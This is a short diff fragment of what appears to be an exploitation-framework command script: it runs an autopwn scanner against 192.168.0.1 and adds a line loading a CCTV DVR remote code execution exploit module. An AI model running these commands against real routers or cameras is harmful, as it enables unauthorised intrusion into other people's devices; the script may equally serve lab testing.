@@ -4,3 +4,4 @@ use scanners/autopwn
 show options
 set target 192.168.0.1
 run
+use exploits/cameras/multi/cctv_dvr_rce
